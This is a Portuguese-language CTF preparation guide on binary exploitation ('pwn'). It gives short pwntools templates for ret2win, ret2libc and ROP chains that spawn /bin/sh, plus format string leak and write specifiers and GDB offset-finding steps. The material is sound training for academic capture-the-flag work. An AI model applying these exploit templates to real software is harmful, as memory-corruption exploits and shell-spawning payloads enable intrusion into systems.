# 06 — PWN AVANÇADO

> Coringa: `scripts/pwn_template.py` já é o esqueleto do exploit. Aqui estão os
> tipos de ataque pra você reconhecer qual o desafio pede.

---

## SEMPRE comece por

```bash
checksec --file=./programa
```
Leia as proteções (define a dificuldade):
- **NX ligado** → não dá pra injetar código na pilha; use ret2win ou ROP.
- **Canary (Stack canary) ausente** → overflow simples funciona. Presente → precisa vazar.
- **PIE ausente / No PIE** → endereços são fixos (mais fácil). PIE → precisa de leak.
- **RELRO parcial** → GOT pode ser sobrescrita.

---

## TIPO 1 — ret2win (o mais comum em faculdade)

Existe uma função escondida que imprime a flag; você só precisa pular pra ela.
```python
from pwn import *
p = process('./programa')
offset = 40                       # ache com cyclic (veja abaixo)
win = 0x401176                    # endereço da função win (nm/Ghidra)
p.sendline(b'A'*offset + p64(win))
p.interactive()
```
Achar o offset:
```bash
# gera padrão, roda, vê onde quebrou:
python3 -c "from pwn import *; print(cyclic(100).decode())" | ./programa
# pegue o valor em RSP no crash e:
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

---

## TIPO 2 — ret2libc (NX ligado, sem função win)

Chame `system("/bin/sh")` usando a própria libc:
```python
from pwn import *
elf = context.binary = ELF('./programa')
libc = ELF('./libc.so.6')         # a libc que deram
p = process('./programa')
# 1) vaze um endereço da libc (ex: puts da GOT) pra derrotar o ASLR
# 2) calcule a base da libc, ache system e "/bin/sh"
# 3) monte: offset + pop_rdi + binsh + system
```

---

## TIPO 3 — ROP chain (NX ligado, precisa encadear)

```bash
ROPgadget --binary ./programa | grep "pop rdi"    # acha gadgets
# pwntools monta a cadeia:
```
```python
rop = ROP(elf)
rop.call('system', [next(elf.search(b'/bin/sh'))])
payload = b'A'*offset + rop.chain()
```

---

## TIPO 4 — format string

Entrada vai direto pro `printf(entrada)`? Então:
```
%p %p %p %p        -> vaza memória da pilha (ache a flag/canary)
%7$s               -> lê string no 7º argumento
%n                 -> ESCREVE em memória (sobrescreve GOT, etc)
```
Automatize leaks com `fmtstr_payload` do pwntools.

---

## DEBUG com GDB + pwndbg

```bash
gdb ./programa
pwndbg> b main
pwndbg> run
pwndbg> cyclic 100        # gera padrão
pwndbg> c                 # continua até crashar
pwndbg> cyclic -l 0x...   # calcula o offset do crash
```

---

## REALISMO PRA AMANHÃ

Pwn dá muito ponto, mas consome muito tempo. Se houver desafio de forense, web,
cripto ou osint ainda aberto, pontue LÁ primeiro. Deixe pwn pro final, e se pegar,
mire num **ret2win** (o mais provável num CTF acadêmico). Chame o colega que manja de C.
